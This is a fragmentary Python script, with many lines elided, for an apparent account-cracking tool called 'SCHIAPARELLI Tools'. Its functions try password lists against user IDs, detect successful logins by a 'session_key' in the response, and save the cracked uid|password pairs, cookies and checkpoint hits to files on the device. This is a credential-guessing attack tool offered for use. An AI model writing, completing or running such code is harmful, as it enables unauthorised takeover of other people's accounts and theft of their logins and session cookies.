...
try:
	...
	os.system('python NINO.py')
os.system("clear")
print('\n\033[1;32m Loading Schiaparelli Tools...')
...
def clear():
	os.system('clear')
	print(logo)
folder_path = '/sdcard/SCHIAPARELLI'
try:
...
loop=0
logo=("""\033[1;38m 
\033[1;38m888     888  .d8888b.  8888888888 8888888b.  
\033[1;37m888     888 d88P  Y88b 888        888   Y88b 
\033[1;38m888     888 Y88b.      888        888    888 
\033[1;37m888     888  "Y888b.   8888888    888   d88P 
\033[1;38m888     888     "Y88b. 888        8888888P"  
\033[1;37m888     888       "888 888        888 T88b   
Y\033[1;38m88b. .d88P Y88b  d88P 888        888  T88b  
\033[1;38m "Y88888P"   "Y8888P"  8888888888 888   T88b \033[1;32m ANIS\033[1;37m 
----------------------------------------------
...
\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32m0.2\033[1;37m 
------------------------------------------------""")
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[SCHIAPARELLI]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[SCHIAPARELLI-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'SCHIAPARELLI_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'SCHIAPARELLI_COOKIES.txt')
						...
						file_path = os.path.join(folder_path, 'SCHIAPARELLI-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[SCHIAPARELLI-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [SCHIAPARELLI-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'SCHIAPARELLI_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
